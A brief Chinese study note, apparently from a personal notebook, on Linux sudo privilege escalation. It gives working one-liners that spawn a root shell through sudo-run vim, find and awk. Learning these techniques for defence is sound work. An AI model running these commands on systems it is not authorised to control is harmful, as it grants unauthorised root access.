sudo提权
vim中可以使用系统命令
```
:!touch 123.txt
```
这样就可以创建文件
![[Pasted image 20231218232929.png]]
同时我们在里面执行
```
!/bin/bash
```
![[Pasted image 20231218232955.png]]
直接就强制换成root,这就跟root没有两样了

![[Pasted image 20231218233049.png]]
这样为什么要退很多次
因为找出来的有好多个一样的文件都可以打开root
```
sudo find . -exec /bin/bash \;
```

或者是这种方法也可
```
sudo awk 'BEGIN {system("/bin/bash")}' test1.txt
```
然后输入当前用户密码就可以有root了
所以有各种方式都可以进行提权
所以防不胜防 (很多黑客手段) 

[Linux提权——SUDO_sudo提权-CSDN博客](https://blog.csdn.net/negnegil/article/details/120090266)
